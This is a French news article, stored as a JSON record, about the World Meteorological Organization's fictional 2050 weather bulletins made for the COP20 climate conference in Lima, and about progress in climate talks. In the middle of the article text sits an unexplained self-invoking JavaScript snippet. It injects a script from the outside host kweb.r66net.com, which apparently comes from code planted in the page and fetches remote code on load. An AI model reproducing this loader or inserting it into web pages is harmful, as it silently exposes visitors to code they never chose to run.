{"title": "Le bulletin meteo de 2050 : il fera vraiment chaud demain !", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-07-02", "content": "A l'occasion de la COP 20, la conference sur le climat qui s'est tenue a Lima en decembre 2014, l'Organisation meteorologique mondiale avait realise des faux bulletins meteo pour differents pays dont la France, avec la complicite des chaines televisees et de leurs presentateurs. Une maniere de faire entrer dans le concret les effets du changement climatique en cours. COP21 : le bulletin meteo prevoit de fortes chaleurs pour 2050                       A quoi pourrait ressembler le bulletin meteo en 2050 ? En partenariat avec l'organisation meteorologique mondiale, une simulation tres serieuse a ete developpee puis devoilee en video par Meteo France. Un indice : il va faire chaud, tres chaud...                                       Article paru le 5 decembre 2014 Lorsqu'elle parle du  forcage anthropique , Evelyne Dheliat, de TF1, evoque maladroitement  << les >>  CO 2  mais peu importe : son message passe tres bien. Au Canada, c'est Patrick de Bellefeuille, presentateur de MeteoMedia qui egrene les consequences de l'elevation des temperatures et du niveau de l'ocean, avant d'annoncer une  canicule  au centre et un  ouragan  a l'est. Ces  bulletins meteo fictifs  sont l'oeuvre de l'OMM (Organisation meteorologique mondiale) qui les a publies sur  YouTube  a l'occasion du sommet international sur le  climat  qui se tient depuis lundi premier decembre a Lima, au Perou, jusqu'a la fin de la semaine prochaine. C'est la <<  COP  20 >>,  Conference of the parties , de la CCNUCC (Convention-cadre des Nations unies sur le changement climatique), vingtieme du nom depuis la creation de cette convention a Rio en 1992. Ces conferences sont couplees avec les reunions des signataires du  protocole de Kyoto , les << Convention des parties >>, ou  CMP  ( Conference of the Parties serving as the meeting of the Parties to the Kyoto Protocol ). Lima accueille la CMP 10. Patrick de Bellefeuille presente le bulletin meteo pour demain, 30 aout 2050, valable pour l'ensemble du Canada. Il rappelle qu'aux iles de la Madeleine la pollution des nappes phreatiques par l'eau de mer, a cause de la hausse du niveau de l'ocean, contraint les habitants a fuir. (c) WMO                               Des actions pour le climat sont bien la Apres avoir touche le fond en  2009 a Copenhague , les COP ont permis quelques avancees et prises de conscience. Le << fonds vert >>, enterine a  Cancun , en 2010 et destine a aider les pays pauvres a reduire leurs  emissions  de  gaz a effet de serre , a commence a se remplir. Avec dix milliards de dollars deja donnes par 21 pays, alors que ce fonds est dimensionne a 100 milliards d'ici a 2020, le reservoir est loin d'etre rempli mais il n'est plus vide... De quoi esperer des progres a Lima, puis a Paris en 2015 et a Dakar en 2016.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La grande surprise de l'annee vint de la Chine et des Etats-Unis, les deux plus grands emetteurs de gaz a effet de serre, non signataires du  protocole de Kyoto  et reticents a s'imposer des limites. En novembre dernier, ces deux pays ont annonce une diminution de leurs  emissions de gaz a effet de serre , la Chine promettant un pic autour de 2030, voire plus tot, et les Etats-Unis prevoyant une baisse de 26 a 28 % en 2025 par rapport a 2005. Ces contraintes sont bien en deca de celles du protocole de Kyoto et des efforts negocies dans le cadre des COP mais, s'agissant des plus gros producteurs de CO 2  de la planete (42 % du total mondial a eux deux), l'effet ne devrait pas etre negligeable. Comme le rappelle l'OMM, si l'augmentation des emissions de gaz a effet de serre se poursuit, il faut s'attendre a une elevation de la temperature moyenne de 4 degC a la fin de ce siecle, ce qui induira des changements importants dans la machine climatique. Les bulletins  meteo  risquent donc d'etre significativement differents de ceux d'aujourd'hui... ", "theme": "planete"}